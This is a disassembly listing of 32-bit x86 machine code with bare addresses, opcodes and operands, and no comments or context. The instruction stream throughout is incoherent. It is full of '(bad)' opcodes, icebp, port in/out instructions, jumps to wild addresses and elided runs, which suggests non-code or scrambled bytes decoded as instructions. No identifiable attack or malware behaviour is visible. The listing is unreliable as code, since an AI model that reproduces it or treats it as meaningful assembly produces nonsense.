  43dfb3:	sti    
  43dfb4:	js     0x43df39
  43dfb6:	sbb    BYTE PTR [ebx+0x4069f9ee],bl
  43dfbc:	icebp  
  43dfbd:	cli    
  43dfbe:	shr    DWORD PTR [edx-0x7d27212b],cl
  43dfc4:	out    dx,al
  43dfc5:	jge    0x43df7f
  43dfc7:	out    dx,eax
  43dfc8:	mov    al,al
  43dfca:	inc    eax
  43dfcb:	out    dx,eax
  43dfcc:	add    ch,0xb3
  43dfcf:	push   esi
  43dfd0:	mov    BYTE PTR [ebx+ebp*4],ah
  43dfd3:	(bad)  
  43dfd4:	out    dx,al
  43dfd5:	mov    esi,DWORD PTR [ecx-0x39]
  43dfd8:	out    dx,al
  43dfd9:	stc    
  43dfda:	fwait
  43dfdb:	cld    
  43dfdc:	jle    0x43df69
  43dfde:	mov    BYTE PTR [ecx-0x12],ch
  43dfe1:	stc    
  43dfe2:	pushf  
  43dfe3:	fwait
  43dfe4:	loopne 0x43dfdf
  43dfe6:	sub    DWORD PTR [esi-0x3f],0x4
  43dfea:	jno    0x43e017
  43dfec:	jno    0x43dfeb
  43dfee:	jbe    0x43e006
  43dff0:	out    dx,al
  43dff1:	test   DWORD PTR [ecx+0x7],esi
  43dff4:	in     eax,dx
  43dff5:	stc    
  43dff6:	arpl   WORD PTR [eax+0x58],bp
  43dff9:	clc    
  43dffa:	mov    BYTE PTR [eax-0x80],0xf4
	...
  43e016:	add    BYTE PTR [edx+0x4],dl
  43e019:	and    dh,dl
  43e01b:	pop    esp
  43e01c:	adc    ecx,DWORD PTR [edx+esi*8]
  43e01f:	cmp    eax,0x77072b85
  43e024:	les    edx,FWORD PTR [ebx+0x2cdb106]
  43e02a:	jle    0x43dfe3
  43e02c:	fdivr  QWORD PTR [esi-0xd1e2f78]
  43e032:	icebp  
  43e033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e034:	neg    DWORD PTR [ebp+0x40]
  43e037:	adc    BYTE PTR ds:0xe10d3474,bl
  43e03d:	fidiv  DWORD PTR [edi-0x6]
  43e040:	sbb    edx,DWORD PTR [eax+edi*8-0x79]
  43e044:	pop    es
  43e045:	adc    BYTE PTR [edi-0x1c],ch
  43e048:	pop    ecx
  43e049:	in     al,dx
  43e04a:	lods   al,BYTE PTR ds:[esi]
  43e04b:	and    eax,0xffffffba
  43e04e:	icebp  
  43e04f:	jns    0x43dfdb
  43e051:	or     esi,ecx
  43e053:	fucom  st(0)
  43e055:	pop    esp
  43e056:	xchg   edi,eax
  43e057:	pop    eax
  43e058:	loopne 0x43dffc
  43e05a:	icebp  
  43e05b:	cmp    dl,BYTE PTR [edx-0x1f410794]
  43e061:	xchg   edx,eax
  43e062:	(bad)  
  43e064:	icebp  
  43e065:	mov    dh,cl
  43e067:	xor    ecx,ecx
  43e069:	jmp    0x43dff1
  43e06b:	mov    ah,0x59
  43e06d:	out    0x84,al
  43e06f:	mov    ecx,0x88764e0
  43e074:	loopne 0x43e0e0
  43e076:	icebp  
  43e077:	and    al,0x8c
  43e079:	ins    BYTE PTR es:[edi],dx
  43e07a:	sub    BYTE PTR [eax],al
	...
  43e094:	(bad)  
  43e095:	loopne 0x43e0f1
  43e097:	jg     0x43e108
  43e099:	fst    DWORD PTR [ecx-0xf]
  43e09c:	jge    0x43e08b
  43e09e:	pop    ds
  43e09f:	loopne 0x43e10e
  43e0a1:	loopne 0x43e109
  43e0a3:	enter  0x89f0,0x27
  43e0a7:	js     0x43e10a
  43e0a9:	add    DWORD PTR [eax],0x22
  43e0ac:	mov    BYTE PTR gs:[ebx-0x621bb0b],bh
  43e0b3:	adc    BYTE PTR [ecx-0x20],ah
  43e0b6:	stc    
  43e0b7:	jmp    0x16686c7c
  43e0bc:	inc    ebp
  43e0bd:	fimul  WORD PTR [edi+0x5c]
  43e0c0:	mov    ebx,ecx
  43e0c2:	cli    
  43e0c3:	push   es
  43e0c4:	and    eax,0x4309e84f
  43e0c9:	fdivp  st(1),st
  43e0cb:	bound  esp,QWORD PTR [edx]
  43e0cd:	mov    cl,al
  43e0cf:	push   0x3c
  43e0d1:	or     eax,0x438eb705
  43e0d6:	in     al,0x54
  43e0d8:	stc    
  43e0d9:	popa   
  43e0da:	(bad)
  43e0dd:	jae    0x43e103
  43e0df:	into   
  43e0e0:	in     al,0xdd
  43e0e2:	push   ecx
  43e0e3:	pop    ds
  43e0e4:	inc    eax
  43e0e5:	dec    edi
  43e0e6:	mov    esp,DWORD PTR [ebx+ebp*8-0x26]
  43e0ea:	stc    
  43e0eb:	mov    dh,0x47
  43e0ed:	mov    BYTE PTR [ebx-0x73],bh
  43e0f0:	scas   eax,DWORD PTR es:[edi]
  43e0f1:	jb     0x43e11f
  43e0f3:	jmp    0xf60842ef
	...
  43e110:	add    BYTE PTR [edx-0x3c],bh
  43e113:	je     0x43e0ff
  43e115:	jo     0x43e0e0
  43e117:	stc    
  43e118:	bound  edi,QWORD PTR [edx+0x28]
  43e11b:	stc    
  43e11c:	xchg   BYTE PTR [ebx+ecx*4-0x73b982b5],ah
  43e123:	mov    edi,DWORD PTR [ebp-0x5b]
  43e126:	(bad)  
  43e128:	cmp    DWORD PTR [ecx+ebp*8-0x378f9907],0x58b76404
  43e133:	std    
  43e134:	imul   edi,DWORD PTR [eax],0x1b6485dd
  43e13a:	fdivp  st(1),st
  43e13c:	add    BYTE PTR [edx+0x7ff04d5e],dh
  43e142:	pop    esi
  43e143:	test   esp,esi
  43e145:	and    edx,ebp
  43e147:	imul   eax
  43e149:	xchg   ebp,eax
  43e14a:	shl    bh,0xff
  43e14d:	faddp  st(7),st
  43e14f:	add    al,0x85
  43e151:	or     eax,0x1682fb58
  43e156:	aad    0x85
  43e158:	inc    ebp
  43e159:	or     DWORD PTR [ebx+eax*4],esi
  43e15c:	test   DWORD PTR [ecx],edi
  43e15e:	aam    0xf7
  43e160:	call   DWORD PTR [eax+0x22fef45e]
  43e166:	out    dx,eax
  43e167:	call   0xf818d795
  43e16c:	sbb    DWORD PTR [ecx+0xc],0x7d
  43e170:	shr    BYTE PTR [ecx+0xcb7b03],0x0
	...
  43e18b:	add    BYTE PTR [eax],al
  43e18d:	add    BYTE PTR [edx],ah
  43e18f:	pop    ebx
  43e190:	jge    0x43e1b6
  43e192:	ret    0xf7ee
  43e195:	lea    esp,[eax]
  43e197:	aad    0x49
  43e199:	lea    edx,[eax-0x23]
  43e19c:	idiv   bh
  43e19e:	mov    ds:0xa2eb02c1,al
  43e1a3:	out    dx,al
  43e1a4:	jnp    0x43e16a
  43e1a6:	(bad)  [ebp-0x7c318b40]
  43e1ac:	ret    
  43e1ad:	call   DWORD PTR [esi+0x3c]
  43e1b0:	cld    
  43e1b1:	(bad)  
  43e1b2:	fcom   st(4)
  43e1b4:	push   eax
  43e1b5:	mov    ebx,DWORD PTR [eax]
  43e1b7:	sub    eax,0x8422fff7
  43e1bc:	test   esp,esi
  43e1be:	and    ebp,esi
  43e1c0:	test   DWORD PTR [ecx-0x8dad8],0x30b56012
  43e1ca:	and    ch,dh
  43e1cc:	imul   eax
  43e1ce:	hlt    
  43e1cf:	pop    ss
  43e1d0:	(bad)  
  43e1d1:	stc    
  43e1d2:	jae    0x43e23f
  43e1d4:	enter  0x7104,0x2c
  43e1d8:	js     0x43e1d7
  43e1da:	jbe    0x43e1ef
  43e1dc:	jmp    0x2d5b9366
  43e1e1:	(bad)  
  43e1e2:	punpckhwd mm4,QWORD PTR [eax]
  43e1e5:	stc    
  43e1e6:	dec    ebx
  43e1e7:	daa    
  43e1e8:	ja     0x43e1f8
  43e1ea:	push   DWORD PTR [eax+0x34]
  43e1ed:	stc    
  43e1ee:	cmp    esi,edi
  43e1f0:	jbe    0x43e1f8
	...
  43e20a:	add    ch,ch
  43e20c:	nop
  43e20d:	icebp  
  43e20e:	jae    0x43e201
  43e210:	les    esi,FWORD PTR [eax-0x10]
  43e213:	test   al,0xe8
  43e215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e216:	xchg   edi,eax
  43e217:	sbb    edx,edi
  43e219:	jmp    0xbf9:0xeac87985
  43e220:	pop    ecx
  43e221:	inc    eax
  43e222:	cld    
  43e223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e224:	jo     0x43e1a6
  43e226:	hlt    
  43e227:	cli    
  43e228:	mov    dh,0xea
  43e22a:	call   0xfa2ea41c
  43e22f:	ja     0x43e1e0
  43e231:	add    DWORD PTR [ebx+0x7cfd17b4],eax
  43e237:	scas   eax,DWORD PTR es:[edi]
  43e238:	xchg   esi,eax
  43e239:	jbe    0x43e28e
  43e23b:	rol    BYTE PTR [eax+0x48],1
  43e23e:	cld    
  43e23f:	and    al,0x53
  43e241:	mov    BYTE PTR [ebx+eax*8],ah
  43e244:	jle    0x43e230
  43e246:	mov    ebp,DWORD PTR [ecx+0x7f]
  43e249:	jmp    0x43e244
  43e24b:	mov    bl,0x64
  43e24d:	cwde   
  43e24e:	fs stos DWORD PTR es:[edi],eax
  43e250:	xchg   dl,ch
  43e252:	xchg   DWORD PTR [ecx-0xd],esp
  43e255:	call   0xb6c77e53
  43e25a:	out    0x93,al
  43e25c:	outs   dx,BYTE PTR ds:[esi]
  43e25d:	jle    0x43e223
  43e25f:	lock add al,0x6c
  43e262:	ret    
  43e263:	or     BYTE PTR [edx],al
  43e265:	mov    dx,0x897d
  43e269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e26a:	out    dx,eax
  43e26b:	jns    0x43e1f4
  43e26d:	add    ebp,edi
	...
  43e287:	add    BYTE PTR [ebp-0x23],ch
  43e28a:	je     0x43e224
  43e28c:	sub    dh,bl
  43e28e:	cmp    ch,dh
  43e290:	jae    0x43e221
  43e292:	ret    
  43e293:	out    dx,al
  43e294:	dec    ebp
  43e295:	fst    QWORD PTR [ebp+0x21d87f80]
  43e29b:	out    dx,al
  43e29c:	cmp    eax,0x3d735c8b
  43e2a1:	fst    QWORD PTR [edx]
  43e2a3:	fucomi st,st(2)
  43e2a5:	jmp    0x88eb:0xc8a9ee0a
  43e2ac:	xor    al,0x58
  43e2ae:	out    0x82,al
  43e2b0:	xor    ebp,ebx
  43e2b2:	pop    esi
  43e2b3:	cwde   
  43e2b4:	mov    al,ds:0x71edeadd
  43e2b9:	lahf   
  43e2ba:	dec    ebx
  43e2bb:	in     eax,dx
  43e2bc:	std    
  43e2bd:	fsubr  QWORD PTR [esi-0x79]
  43e2c0:	test   ch,bl
  43e2c2:	shr    ch,cl
  43e2c4:	jns    0x43e295
  43e2c6:	out    0xbc,al
  43e2c8:	stc    
  43e2c9:	or     DWORD PTR [edi-0x13],0xf3fedcdd
  43e2d0:	dec    edx
  43e2d1:	or     al,0x5e
  43e2d3:	inc    edi
  43e2d4:	fcom   DWORD PTR [ebx+eiz*8+0x28]
  43e2d8:	mov    edx,DWORD PTR [edi-0x17]
  43e2db:	xor    BYTE PTR [ebx+0x1478c020],bh
  43e2e1:	nop
  43e2e2:	ins    BYTE PTR es:[edi],dx
  43e2e3:	sub    BYTE PTR [ebp+0x7f798adc],ch
  43e2e9:	cmc    
  43e2ea:	sub    ebp,0x0
	...
  43e304:	add    BYTE PTR [ebp-0x7812e7cb],bl
  43e30a:	or     eax,0xdea17600
  43e30f:	jge    0x43e2b6
  43e311:	mov    BYTE PTR ds:0x32b81a5a,bh
  43e317:	test   DWORD PTR [ebx+ebp*1-0x66],eax
  43e31b:	test   DWORD PTR [ecx],esi
  43e31d:	or     eax,0xfd3785b3
  43e322:	ja     0x43e394
  43e324:	inc    esi
  43e325:	push   ecx
  43e326:	fisub  WORD PTR ds:0x6877ed1e
  43e32c:	ss popa 
  43e32e:	fisubr WORD PTR [eax+0x39]
  43e331:	lock add al,0x0
  43e334:	xchg   ebx,eax
  43e335:	test   BYTE PTR [ebx-0x79],0x7c
  43e339:	add    al,0xde
  43e33b:	stc    
  43e33c:	push   ss
  43e33d:	scas   eax,DWORD PTR es:[edi]
  43e33e:	ja     0x43e380
  43e340:	push   cs
  43e341:	sbb    esi,ebx
  43e343:	xchg   DWORD PTR [esp+eax*8-0x23],ebp
  43e347:	stc    
  43e348:	(bad)  
  43e349:	sahf   
  43e34a:	xchg   edi,eax
  43e34b:	pusha  
  43e34c:	mul    BYTE PTR [eax]
  43e34e:	fiadd  WORD PTR [edi+0x4b84239c]
  43e354:	rcl    DWORD PTR [eax],0xf8
  43e357:	sbb    ebp,DWORD PTR [ebp-0x4e7afb4c]
  43e35d:	je     0x43e31f
  43e35f:	or     al,0x64
  43e361:	mov    esp,0x13801350
  43e366:	add    eax,0xe900
	...
  43e37f:	add    BYTE PTR [eax],al
  43e381:	add    BYTE PTR [edx-0x68],bl
  43e384:	hlt    
  43e385:	mov    bh,0xe0
  43e387:	fld    QWORD PTR [ebp-0x5c15db4e]
  43e38d:	xchg   ecx,eax
  43e38e:	add    al,0xd8
  43e390:	stc    
  43e391:	sahf   
  43e392:	sub    BYTE PTR [edi],bh
  43e394:	test   DWORD PTR [edx+0x2ce3823c],ebp
  43e39a:	mov    ch,0xc8
  43e39c:	int3   
  43e39d:	add    BYTE PTR [ecx-0x65],ch
  43e3a0:	int3   
  43e3a1:	int3   
  43e3a2:	dec    ecx
  43e3a3:	fwait
  43e3a4:	int3   
  43e3a5:	int3   
  43e3a6:	lock pop ebp
  43e3a8:	in     al,dx
  43e3a9:	or     DWORD PTR [ecx],0xfffffffc
  43e3ac:	dec    ebp
  43e3ad:	mov    esp,DWORD PTR [eax-0x293fd325]
  43e3b3:	shl    BYTE PTR [ebp+ebp*1-0x4e],1
  43e3b7:	scas   al,BYTE PTR es:[edi]
  43e3b8:	or     BYTE PTR [eax],al
  43e3ba:	pop    ebp
  43e3bb:	pop    es
  43e3bc:	test   DWORD PTR [ebp+0x1],edi
  43e3bf:	aad    0x9d
  43e3c1:	mov    DWORD PTR [eax+0x94581ef],edx
  43e3c7:	pop    ebp
  43e3c8:	cmp    eax,0xf9af6d08
  43e3cd:	dec    DWORD PTR [ebp+0x7]
  43e3d0:	test   DWORD PTR [ebp+0x1],edx
  43e3d3:	shl    BYTE PTR [esi-0x5],0xa
  43e3d7:	jmp    0x4855a857
  43e3dc:	push   esi
  43e3dd:	mov    esi,eax
  43e3df:	dec    edx
  43e3e0:	mov    edx,0x455c0d08
  43e3e5:	or     BYTE PTR [eax],al
	...
  43e3ff:	ins    BYTE PTR es:[edi],dx
  43e400:	scas   eax,DWORD PTR es:[edi]
  43e401:	stc    
  43e402:	call   FWORD PTR ds:0x25d22b07
  43e408:	arpl   bx,si
  43e40a:	call   FWORD PTR [edx]
  43e40c:	add    esp,0x4
  43e40f:	sub    ebx,DWORD PTR [edx-0x23]
  43e412:	pop    ebp
  43e413:	lahf   
  43e414:	fyl2xp1 
  43e416:	retf   
  43e417:	test   eax,0x89cccc9d
  43e41c:	popf   
  43e41d:	int3   
  43e41e:	int3   
  43e41f:	lock pop ecx
  43e421:	in     al,dx
  43e422:	push   esi
  43e423:	push   esi
  43e424:	push   esp
  43e425:	or     BYTE PTR [ebp-0x72f7ab9d],al
  43e42b:	adc    ecx,DWORD PTR [ebx-0x520ba2aa]
  43e431:	add    BYTE PTR [eax],al
  43e433:	ja     0x43e47f
  43e435:	in     al,0x0
  43e437:	hlt    
  43e438:	jmp    0x43e437
  43e43a:	jae    0x43e42e
  43e43c:	icebp  
  43e43d:	fisttp DWORD PTR [edx-0x7a1aac72]
  43e443:	xor    bl,BYTE PTR [edx+edi*2+0x4e56e04a]
  43e44a:	adc    al,0x24
  43e44c:	popf   
  43e44d:	out    0xce,al
  43e44f:	retf   0xfdc5
  43e452:	clc    
  43e453:	add    DWORD PTR [eax+edi*4],ecx
  43e456:	cmp    eax,0x10c06ef4
  43e45b:	daa    
  43e45c:	sub    al,0x46
  43e45e:	pop    ebx
  43e45f:	ss call 0x44b062
	...
  43e479:	add    BYTE PTR [eax],al
  43e47b:	add    BYTE PTR [eax],bh
  43e47d:	clc    
  43e47e:	mov    bh,0xcc
  43e480:	xor    BYTE PTR [eax],dl
  43e482:	mov    eax,0xb82828cc
  43e487:	int3   
  43e488:	inc    eax
  43e489:	cdq    
  43e48a:	jp     0x43e478
  43e48c:	ja     0x43e466
  43e48e:	icebp  
  43e48f:	push   eax
  43e490:	out    0x2,eax
  43e492:	sub    edi,DWORD PTR [ebx-0x4]
  43e495:	dec    edi
  43e496:	sti    
  43e497:	mov    bh,BYTE PTR [ebx+0x11854535]
  43e49d:	mov    ebx,eax
  43e49f:	adc    al,0xf4
  43e4a1:	sbb    DWORD PTR [ecx+0x73],edi
  43e4a4:	in     al,dx
  43e4a5:	es in  eax,dx
  43e4a7:	je     0x43e4a5
  43e4a9:	data16 aas 
  43e4ab:	pusha  
  43e4ac:	jmp    DWORD PTR [ecx]
  43e4ae:	pusha  
  43e4af:	jae    0x43e4a2
  43e4b1:	and    DWORD PTR [esi+edx*4+0x59e69adb],ebp
  43e4b8:	jg     0x43e482
  43e4ba:	dec    eax
  43e4bb:	mov    esi,0xba2cebe0
  43e4c0:	aam    0x4
  43e4c2:	out    0x3,eax
  43e4c4:	hlt    
  43e4c5:	push   eax
  43e4c6:	loope  0x43e519
  43e4c8:	pushf  
  43e4c9:	test   DWORD PTR [edx+ebp*8+0xc1c87ad],0xf01c8833
  43e4d4:	sub    cl,BYTE PTR [eax-0x12db17dc]
  43e4da:	and    esi,ecx
  43e4dc:	(bad)  
  43e4dd:	fldenv [esi-0x41]
	...
  43e4f8:	add    al,dh
  43e4fa:	jg     0x43e523
  43e4fc:	outs   dx,DWORD PTR ds:[esi]
  43e4fd:	out    dx,eax
  43e4fe:	cmp    bl,BYTE PTR [edi+0x52d96d8c]
  43e504:	dec    edx
  43e505:	jno    0x43e4e6
  43e507:	lods   al,BYTE PTR ds:[esi]
  43e508:	lds    ecx,FWORD PTR [eax]
  43e50a:	add    eax,0x4445b96
  43e50f:	out    0x3,eax
  43e511:	fiadd  DWORD PTR [ebx]
  43e513:	call   0xf446:0x1af8e7ea
  43e51a:	lea    edi,[edi]
  43e51c:	xchg   BYTE PTR [eax],dh
  43e51e:	or     dh,bl
  43e520:	retf   0x45a8
  43e523:	jg     0x43e528
  43e525:	mov    ah,0x4
  43e527:	out    0x5d,eax
  43e529:	and    esi,DWORD PTR [edx]
  43e52b:	add    dl,BYTE PTR [eax]
  43e52d:	clc    
  43e52e:	enter  0x3a6,0x79
  43e532:	inc    edi
  43e533:	sti    
  43e534:	jge    0x43e4dd
  43e536:	fsub   QWORD PTR [eax+0x3e]
  43e539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e53a:	lea    esi,[esp+ecx*1]
  43e53d:	jae    0x43e574
  43e53f:	xor    edi,DWORD PTR [ebp+0x47]
  43e542:	icebp  
  43e543:	gs sar al,0x8d
  43e547:	out    0x7a,al
  43e549:	cmp    DWORD PTR ds:0x8e546d70,edi
  43e54f:	ds pusha 
  43e551:	jnp    0x43e5c7
  43e553:	add    BYTE PTR [ecx-0xdfffb10],ah
  43e559:	mov    ah,0x54
  43e55b:	pop    ss
  43e55c:	cmp    al,BYTE PTR [eax]
	...
  43e576:	and    eax,0x6bc913de
  43e57b:	sbb    al,BYTE PTR [eax]
  43e57d:	push   0xffffffb4
  43e57f:	or     eax,0x7d502f55
  43e584:	stc    
  43e585:	xchg   BYTE PTR [ebp+0x3b84853e],cl
  43e58b:	xchg   edi,eax
  43e58c:	adc    al,0xe9
  43e58e:	or     BYTE PTR [esp+ecx*1+0x60],al
  43e592:	adc    DWORD PTR [ebp+0x35],ecx
  43e595:	cs add al,0xd
  43e598:	test   DWORD PTR [edi-0x14],ebp
  43e59b:	add    al,0x0
  43e59d:	jmp    0x9cc8f290
  43e5a2:	pop    es
  43e5a3:	adc    cl,cl
  43e5a5:	mov    ebp,0xe6ffc60b
  43e5aa:	test   DWORD PTR [eax+eax*1],0x8d7662
  43e5b1:	jmp    0xf0243fad
  43e5b6:	jo     0x43e5a5
  43e5b8:	(bad)  
  43e5b9:	xchg   esp,eax
  43e5ba:	add    DWORD PTR [edx-0x18],ebx
  43e5bd:	jmp    0x43e55a
  43e5bf:	or     edi,DWORD PTR [ebp+0x1]
  43e5c2:	cli    
  43e5c3:	push   ebx
  43e5c4:	adc    ch,BYTE PTR [esi]
  43e5c6:	not    edi
  43e5c8:	stc    
  43e5c9:	jmp    0x2e4ec7c5
  43e5ce:	not    esi
  43e5d0:	stc    
  43e5d1:	jmp    0xae46c7cd
  43e5d6:	idiv   bh
  43e5d8:	(bad)  
  43e5d9:	call   0x43e5de
	...
  43e5f2:	add    bh,dh
  43e5f4:	add    DWORD PTR [edx+0x4f77d],0x87555060
  43e5fe:	add    BYTE PTR [esi],dh
  43e600:	cmp    DWORD PTR [ecx+0x3b5c417b],eax
  43e606:	je     0x43e65e
  43e608:	pop    esi
  43e609:	mov    WORD PTR [eax],es
  43e60b:	int    0x3
  43e60d:	or     DWORD PTR [ebx+0x455],0x89304626
  43e617:	push   ds
  43e618:	test   al,0x0
  43e61a:	add    BYTE PTR [ebp+0x368dbe58],cl
  43e620:	pop    esp
  43e621:	add    BYTE PTR [eax],al
  43e623:	popf   
  43e624:	stos   BYTE PTR es:[edi],al
  43e625:	add    eax,DWORD PTR [eax]
  43e627:	popf   
  43e628:	add    ebp,ebx
  43e62a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e62b:	push   ss
  43e62c:	sbb    al,0x48
  43e62e:	mov    DWORD PTR [esi],eax
  43e630:	les    eax,FWORD PTR [eax]
  43e632:	add    BYTE PTR [ebp+0x58],bl
  43e635:	dec    eax
  43e636:	dec    esp
  43e637:	push   cs
  43e638:	out    dx,al
  43e639:	or     DWORD PTR [ebx+0x419],0x8b1868e4
  43e643:	lds    ecx,FWORD PTR [edi+0x0]
  43e646:	add    BYTE PTR [ebp-0x80],bl
  43e649:	icebp  
  43e64a:	or     al,0x88
  43e64c:	cmp    eax,0x3958d733
  43e651:	mov    edi,0x3e583
	...
  43e66e:	add    BYTE PTR [eax],al
  43e670:	sbb    al,0x3
  43e672:	add    BYTE PTR [eax],al
  43e674:	xchg   esi,eax
  43e675:	pop    ebx
  43e676:	cwde   
  43e677:	add    BYTE PTR ds:0x754b8103,cl
  43e67d:	pop    eax
  43e67e:	nop
  43e67f:	pushf  
  43e680:	sbb    eax,0x5e890003
  43e685:	pop    edi
  43e686:	or     DWORD PTR [eax+0x6d],0x64
  43e68d:	pop    edx
  43e68e:	add    BYTE PTR [eax],0xf4
  43e691:	jmp    0x43e690
  43e693:	test   BYTE PTR [eax+eax*4+0x52f40004],al
  43e69a:	aaa    
  43e69b:	cld    
  43e69c:	jge    0x43e6d9
  43e69e:	add    BYTE PTR [eax],0xf4
  43e6a1:	jmp    0x43e6d1
  43e6a3:	into   
  43e6a4:	mul    DWORD PTR [ebx-0x34]
  43e6a7:	add    ah,dh
  43e6a9:	jmp    0x43e6b9
  43e6ab:	nop
  43e6ac:	shr    ah,1
  43e6ae:	std    
  43e6af:	push   DWORD PTR [edi-0x53]
  43e6b2:	add    cl,BYTE PTR ds:0x86565cb
  43e6b8:	ins    DWORD PTR es:[edi],dx
  43e6b9:	adc    eax,DWORD PTR [edi+eax*4+0x27]
  43e6bd:	and    BYTE PTR [ebx-0x68],bh
  43e6c0:	xchg   esp,eax
  43e6c1:	in     al,dx
  43e6c2:	std    
  43e6c3:	call   FWORD PTR [edi]
  43e6c5:	lods   al,BYTE PTR gs:[esi]
  43e6c7:	in     al,0xf4
  43e6c9:	jmp    0x43e6c8
  43e6cb:	pop    ecx
  43e6cc:	daa    
  43e6cd:	sub    al,0x41
  43e6cf:	test   DWORD PTR [ecx-0x6f],edx
  43e6d2:	mov    edi,0x14
	...
  43e6eb:	add    BYTE PTR [eax],al
  43e6ed:	hlt    
  43e6ee:	push   0xffffffeb
  43e6f0:	or     cl,ah
  43e6f2:	bound  esp,QWORD PTR ds:0x752ec9d1
  43e6f8:	adc    ebp,eax
  43e6fa:	pop    ds
  43e6fb:	cmp    eax,0x7cd3ce00
  43e700:	dec    ebp
  43e701:	adc    BYTE PTR [ebp+0x24],cl
  43e704:	int3   
  43e705:	mov    bh,0xeb
  43e707:	push   ebp
  43e708:	sub    DWORD PTR [edx-0x48790255],esp
  43e70e:	ret    
  43e70f:	js     0x43e74e
  43e711:	lock jno 0x43e708
  43e714:	push   eax
  43e715:	jge    0x43e69a
  43e717:	adc    DWORD PTR [edi+0x86564cc],eax
  43e71d:	or     al,0x4
  43e71f:	adc    al,0x0
  43e721:	hlt    
  43e722:	add    al,0x6e
  43e724:	repz sub esi,ecx
  43e727:	push   esp
  43e728:	div    DWORD PTR [eax+0x3f]
  43e72b:	fistp  QWORD PTR [esi+0x3df4d21]
  43e731:	hlt    
  43e732:	add    al,0xd0
  43e734:	dec    esi
  43e735:	int    0xd5
  43e737:	mov    edx,0xdcd62552
  43e73c:	and    esi,DWORD PTR [eax-0x4f7d18bf]
  43e742:	or     al,0x3e
  43e744:	jnp    0x43e6fc
  43e746:	cmp    bh,BYTE PTR ss:[ebx-0x69]
  43e74a:	aaa    
  43e74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e74c:	pmuludq mm1,mm0
  43e74f:	fwait
  43e750:	mov    bh,0x0
	...
  43e76a:	test   al,0xc8
  43e76c:	mov    bl,0xb7
  43e76e:	ror    al,0xab
  43e771:	mov    bh,0xb8
  43e773:	enter  0x7b1c,0x90
  43e777:	mov    DWORD PTR [eax+edi*8],esp
  43e77a:	jo     0x43e7c3
  43e77c:	out    dx,eax
  43e77d:	push   ebx
  43e77e:	fiadd  DWORD PTR [ecx*8-0x47fb2dfd]
  43e785:	fisttp DWORD PTR [edx-0x4019b529]
  43e78b:	ret    0x3ef
  43e78e:	inc    eax
  43e78f:	enter  0xb72b,0x38
  43e793:	enter  0x7a9c,0x50
  43e797:	xor    DWORD PTR [edx+0x2a0cbf7a],edx
  43e79d:	add    esi,esp
  43e79f:	add    al,0xe7
  43e7a1:	add    esi,DWORD PTR [ecx-0x46]
  43e7a4:	sub    bh,dh
  43e7a6:	and    edx,ebp
  43e7a8:	out    0x3,eax
  43e7aa:	je     0x43e78d
  43e7ac:	out    0x46,al
  43e7ae:	xor    eax,0xf403e6fe
  43e7b3:	add    al,0x0
  43e7b5:	imul   ecx,DWORD PTR [esi],0xf7e8c2d5
  43e7bb:	add    al,0x0
  43e7bd:	jmp    0xa6583ffe
  43e7c2:	test   DWORD PTR [eax+eax*1],0xc677e9
  43e7c9:	jmp    0x0:0xae0004f7
	...
  43e7e4:	add    BYTE PTR [eax],al
  43e7e6:	add    dl,dl
  43e7e8:	sar    ecx,cl
  43e7ea:	jmp    0xc00117e6
  43e7ef:	mov    dh,0x9
  43e7f1:	je     0x43e7d2
  43e7f3:	js     0x43e7c9
  43e7f5:	stc    
  43e7f6:	jmp    0xea05acf2
  43e7fb:	hlt    
  43e7fc:	add    al,0x0
  43e7fe:	jmp    0xac367a3d
  43e803:	cwde   
  43e804:	pop    eax
  43e805:	or     al,0xae
  43e807:	test   DWORD PTR [eax+eax*1],0xc6b7e9
  43e80e:	jmp    0x43e807
  43e810:	add    al,0x0
  43e812:	or     al,0xb5
  43e814:	ror    esp,0x35
  43e817:	lods   al,BYTE PTR ds:[esi]
  43e818:	ror    esp,0x2d
  43e81b:	lods   al,BYTE PTR ds:[esi]
  43e81c:	ror    esp,0x1a
  43e81f:	cmp    BYTE PTR [eax+0x5227d5f9],cl
  43e825:	stc    
  43e826:	inc    esi
  43e827:	les    ebp,FWORD PTR [ecx]
  43e829:	dec    ebp
  43e82a:	xchg   edi,eax
  43e82b:	lods   eax,DWORD PTR ds:[esi]
  43e82c:	cld    
  43e82d:	sub    al,0x12
  43e82f:	sahf   
  43e830:	ror    DWORD PTR [esi+0x2e],cl
  43e833:	jmp    0x43e825
  43e835:	retf   
  43e836:	stos   BYTE PTR es:[edi],al
  43e837:	test   DWORD PTR [ecx+0x1346af0],0x931f83
  43e841:	push   ecx
  43e842:	push   cs
  43e843:	jmp    0x43e84d
  43e845:	or     eax,0x83085d00
  43e84a:	mov    BYTE PTR [eax],0x0
	...
  43e861:	add    BYTE PTR [eax],al
  43e863:	add    BYTE PTR [ebx+0x3d],ch
  43e866:	mov    ebx,0x82d46b89
  43e86b:	imul   edi,DWORD PTR ds:0x9ba9ccbb,0xffffffcc
  43e873:	int3   
  43e874:	cdq    
  43e875:	fwait
  43e876:	int3   
  43e877:	int3   
  43e878:	and    BYTE PTR [esi-0x14],cl
  43e87b:	mov    esp,DWORD PTR [eax]
  43e87d:	stc    
  43e87e:	jp     0x43e86c
  43e880:	lods   eax,DWORD PTR ds:[esi]
  43e881:	inc    ecx
  43e882:	dec    edi
  43e883:	lea    edx,[eax]
  43e885:	loope  0x43e8d7
  43e887:	lea    eax,[eax]
  43e889:	fld    DWORD PTR [ebp+0x455a8145]
  43e88f:	cld    
  43e890:	into   
  43e891:	call   0xe8ce1a7e
  43e896:	test   DWORD PTR [ebx-0x3b833328],0x74c15291
  43e8a0:	call   0x74c8:0x10fc3d4c
  43e8a7:	sbb    BYTE PTR [esi],dl
  43e8a9:	inc    ebx
  43e8aa:	clc    
  43e8ab:	push   edi
  43e8ac:	fisttp WORD PTR [ebp+0x4d]
  43e8af:	hlt    
  43e8b0:	scas   eax,DWORD PTR es:[edi]
  43e8b1:	dec    esp
  43e8b2:	dec    ebp
  43e8b3:	lock mov ds:0xca515035,al
  43e8b9:	add    al,BYTE PTR [eax+0x12]
  43e8bc:	lea    eax,[edi]
  43e8be:	cmp    eax,0xffffffa5
  43e8c1:	push   esp
  43e8c2:	idiv   edi
